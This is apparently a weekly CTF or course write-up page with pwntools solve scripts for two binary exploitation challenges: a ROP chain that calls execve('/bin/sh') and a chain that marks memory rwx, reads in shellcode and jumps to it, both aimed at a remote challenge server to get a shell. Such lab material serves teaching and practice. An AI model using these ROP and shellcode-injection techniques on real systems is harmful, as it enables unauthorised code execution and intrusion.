+++
title = "Week 03"
weight = 2
slug="week-03"
description = "- minimal: syscall to call execve(\"bin/sh\", 0, 0)<br>- minimal 2: syscall to mprotect a region of memory to be rwx, then syscall to read shellcode to it and jump to the shellcode"
+++

# minimal
Syscall to call execve("/bin/sh", 0, 0)

Solve script:
``` py
from pwn import *

p = remote("128.199.12.141", 7005)

elf = ELF('./minimal')

buf = b'A'*8

shell = p64(0x402000)
syscall = p64(0x401032)
rax = p64(0x40100e)
rdi = p64(0x401004)
rsi = p64(0x401006)
rdx = p64(0x401008)

p.sendline(buf + rax + p64(59) + rdi + shell + rsi + p64(0) + rdx + p64(0) + syscall)

p.interactive()
```

# minimal 2
Syscall to mprotect a region of memory to be rwx then syscall to read shellcode to it then jump to the shellcode

Solve script:
``` py
from pwn import *

p = remote("128.199.12.141", 7006)
#p = process('./minimal_2')
#gdb.attach(p)

elf = ELF('./minimal_2')
context.arch = elf.arch
context.log_level = 'DEBUG'

buf = b'A'*8
shellcode = asm(shellcraft.sh())

syscall = p64(0x401013)
rax = p64(0x40100e)
rdi = p64(0x401004)
rsi = p64(0x401006)
rdx = p64(0x401008)
rbp = p64(0x401017)
code_addr = p64(0x400000)

# mmap 0x400000 to be rwx
payload = buf + rax + p64(10) + rdi + code_addr + rsi + p64(0x1000) + rdx + p64(7) + syscall

# read shellcode to 0x400000
payload += rax + p64(0) + rdi + p64(0) + rsi + code_addr + rdx + p64(0x1000) + syscall

# jump to shellcode
payload += code_addr


# send payload then shellcode
p.sendline(payload)
p.sendline(shellcode)

p.interactive()
```
